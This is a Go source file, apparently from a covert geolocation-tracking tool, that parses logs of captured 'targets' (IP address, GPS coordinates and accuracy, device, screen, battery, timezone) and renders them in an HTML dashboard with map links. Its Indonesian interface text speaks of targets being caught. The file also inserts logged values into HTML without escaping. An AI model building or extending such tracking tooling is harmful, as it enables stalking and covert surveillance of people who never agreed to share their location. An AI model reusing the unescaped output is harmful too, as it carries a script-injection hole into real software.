package tools

import (
	"fmt"
	"net/http"
	"strings"
)

type GeoEntry struct {
	Time, IP, GPS, Acc, UA, Screen, Battery, TZ, Lang string
}

func ParseGeoLine(line string) GeoEntry {
	p := strings.SplitN(line, "|", 9)
	e := GeoEntry{}
	if len(p) > 0 { e.Time = p[0] }
	if len(p) > 1 { e.IP = p[1] }
	if len(p) > 2 { e.GPS = p[2] }
	if len(p) > 3 { e.Acc = p[3] }
	if len(p) > 4 { e.UA = p[4] }
	if len(p) > 5 { e.Screen = p[5] }
	if len(p) > 6 { e.Battery = p[6] }
	if len(p) > 7 { e.TZ = p[7] }
	if len(p) > 8 { e.Lang = p[8] }
	return e
}

func ShortUA(ua string) string {
	l := strings.ToLower(ua)
	switch {
	case strings.Contains(l, "iphone"):        return "iPhone"
	case strings.Contains(l, "ipad"):          return "iPad"
	case strings.Contains(l, "android") && strings.Contains(l, "mobile"): return "Android"
	case strings.Contains(l, "android"):       return "Android Tab"
	case strings.Contains(l, "windows phone"): return "WinPhone"
	case strings.Contains(l, "windows"):       return "Windows"
	case strings.Contains(l, "macintosh"):     return "Mac OS"
	case strings.Contains(l, "linux"):         return "Linux"
	default:                                   return "Unknown"
	}
}

func GuessDevice(ua string) string { return ShortUA(ua) }

func RenderGeoTable(w http.ResponseWriter, rows []string, full bool) {
	var valid []string
	for _, r := range rows { if r != "" { valid = append(valid, r) } }
	if len(valid) == 0 {
		fmt.Fprintf(w, `<div class="empty-state">Belum ada target yang tertangkap.</div>`)
		return
	}
	fmt.Fprintf(w, `<div class="table-responsive" style="max-height:320px;overflow-y:auto;border:1px solid var(--border);border-radius:8px"><table class="table table-sm"><thead><tr><th>WAKTU</th><th>IP</th><th>GPS / ACC</th><th>MAP</th><th>DEVICE</th><th>LAYAR</th><th>BATT</th><th>TZ</th></tr></thead><tbody>`)
	start := 0
	if !full && len(valid) > 20 { start = len(valid) - 20 }
	for i := len(valid) - 1; i >= start; i-- {
		e := ParseGeoLine(valid[i])
		var gpsCell, mapCell string
		if e.GPS == "" || e.GPS == "DENIED" || e.GPS == "PENDING" {
			lbl := e.GPS
			if lbl == "" { lbl = "UNKNOWN" }
			gpsCell = `<span style="color:var(--danger);font-weight:700">` + lbl + `</span>`
			mapCell = `<span style="color:var(--text3)">-</span>`
		} else {
			gpsCell = `<code style="color:var(--success)">` + e.GPS + `</code><br><span style="color:var(--text3);font-size:9px">+/-` + e.Acc + `m</span>`
			mapCell = `<a href="https://www.google.com/maps?q=` + e.GPS + `" target="_blank" class="btn btn-sm btn-primary" style="font-size:9px;padding:2px 7px">MAP</a>`
		}
		bat := e.Battery
		if bat == "" { bat = "-" }
		tz := e.TZ
		if tz == "" { tz = "-" }
		fmt.Fprintf(w, `<tr><td style="white-space:nowrap;color:var(--text3);font-size:10px">%s</td><td><code style="color:var(--primary)">%s</code></td><td>%s</td><td>%s</td><td style="font-size:11px">%s</td><td><code style="color:var(--info);font-size:10px">%s</code></td><td style="color:var(--warning);font-size:11px">%s</td><td style="font-size:9px;color:var(--text3)">%s</td></tr>`,
			e.Time, e.IP, gpsCell, mapCell, ShortUA(e.UA), e.Screen, bat, tz)
	}
	fmt.Fprintf(w, `</tbody></table></div>`)
}
